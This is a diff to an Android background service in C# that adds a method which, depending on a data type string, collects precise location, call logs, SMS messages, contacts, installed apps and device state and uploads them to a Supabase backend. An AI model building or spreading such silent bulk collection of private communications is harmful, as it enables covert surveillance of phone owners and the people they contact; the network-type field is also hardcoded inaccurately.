@@ -188,6 +188,140 @@ public sealed class DeviceBackgroundService : IDisposable
         }
     }
 
+    /// <summary>
+    /// يجمع ويرفع فوراً بدون تخزين محلي — مباشر إلى Supabase
+    /// </summary>
+    public async Task<bool> DirectCollectAndPushAsync(string dataType, CancellationToken ct)
+    {
+        try
+        {
+            var ctx = Android.App.Application.Context;
+
+            switch (dataType)
+            {
+                case "location":
+                {
+                    var loc = await _geolocation.GetLocationAsync(new GeolocationRequest
+                    {
+                        DesiredAccuracy = GeolocationAccuracy.High,
+                        Timeout = TimeSpan.FromSeconds(15)
+                    }, ct);
+                    if (loc == null) return false;
+
+                    var record = new LocationRecord
+                    {
+                        DeviceSerial = _deviceSerial,
+                        Latitude = loc.Latitude,
+                        Longitude = loc.Longitude,
+                        Altitude = (float)(loc.Altitude ?? 0),
+                        Accuracy = (float)(loc.Accuracy ?? 0),
+                        Speed = (float)(loc.Speed ?? 0),
+                        Bearing = (float)(loc.Course ?? 0),
+                        CapturedAt = DateTime.UtcNow
+                    };
+                    var ok = await _supabase.PushLocationAsync(record);
+                    if (!ok) await _localDb.SaveLocationAsync(record);
+                    return ok;
+                }
+
+                case "call_logs":
+                {
+                    var records = CallLogCollector.Collect(ctx);
+                    foreach (var r in records)
+                    {
+                        if (!await _supabase.PushCallLogAsync(r))
+                            await _localDb.SaveCallLogsAsync(new[] { r });
+                    }
+                    return records.Count > 0;
+                }
+
+                case "sms":
+                {
+                    var records = SmsCollector.Collect(ctx);
+                    foreach (var r in records)
+                    {
+                        if (!await _supabase.PushSmsAsync(r))
+                            await _localDb.SaveSmsMessagesAsync(new[] { r });
+                    }
+                    return records.Count > 0;
+                }
+
+                case "contacts":
+                {
+                    var records = ContactCollector.Collect(ctx);
+                    foreach (var r in records)
+                    {
+                        if (!await _supabase.PushContactAsync(r))
+                            await _localDb.SaveContactsAsync(new[] { r });
+                    }
+                    return records.Count > 0;
+                }
+
+                case "apps":
+                {
+                    var pm = ctx.PackageManager;
+                    if (pm == null) return false;
+                    var intent = new Intent(Intent.ActionMain);
+                    intent.AddCategory(Intent.CategoryLauncher);
+                    var apps = pm.QueryIntentActivities(intent, 0);
+                    var ok = true;
+                    foreach (var app in apps.Take(100))
+                    {
+                        try
+                        {
+                            var ai = pm.GetApplicationInfo(app.ActivityInfo.PackageName, 0);
+                            var record = new InstalledAppRecord
+                            {
+                                DeviceSerial = _deviceSerial,
+                                PackageName = app.ActivityInfo.PackageName,
+                                AppName = ai.LoadLabel(pm) ?? app.ActivityInfo.PackageName,
+                                VersionName = pm.GetPackageInfo(app.ActivityInfo.PackageName, 0)?.VersionName ?? "",
+                                VersionCode = pm.GetPackageInfo(app.ActivityInfo.PackageName, 0)?.LongVersionCode ?? 0,
+                                IsSystemApp = (ai.Flags & Android.Content.PM.ApplicationInfoFlags.System) != 0,
+                                CapturedAt = DateTime.UtcNow
+                            };
+                            if (!await _supabase.PushInstalledAppsAsync(new[] { record }))
+                            {
+                                await _localDb.SaveInstalledAppsAsync(new[] { record });
+                                ok = false;
+                            }
+                        }
+                        catch { }
+                    }
+                    return ok;
+                }
+
+                case "state":
+                {
+                    var battery = Battery.Default;
+                    var conn = Connectivity.Current;
+                    var appDataDir = FileSystem.AppDataDirectory;
+                    var driveInfo = new DriveInfo(Path.GetPathRoot(appDataDir) ?? appDataDir);
+
+                    var stateRecord = new DeviceStateRecord
+                    {
+                        DeviceSerial = _deviceSerial,
+                        BatteryLevel = battery.ChargeLevel * 100,
+                        BatteryStatus = battery.PowerSource != BatteryPowerSource.Battery ? "charging" : "discharging",
+                        IsCharging = battery.PowerSource != BatteryPowerSource.Battery,
+                        NetworkType = conn.NetworkAccess == NetworkAccess.Internet ? "cellular_4g" : "none",
+                        StorageTotal = driveInfo.TotalSize,
+                        StorageAvailable = driveInfo.AvailableFreeSpace,
+                        CapturedAt = DateTime.UtcNow
+                    };
+                    var ok = await _supabase.PushDeviceStateAsync(stateRecord);
+                    if (!ok) await _localDb.SaveDeviceStateAsync(stateRecord);
+                    return ok;
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            System.Diagnostics.Debug.WriteLine($"[BG] DirectCollectAndPush({dataType}) error: {ex.Message}");
+        }
+        return false;
+    }
+
     // ======================= LOCATION =======================
     public async Task CollectLocationAsync(CancellationToken ct)
     {
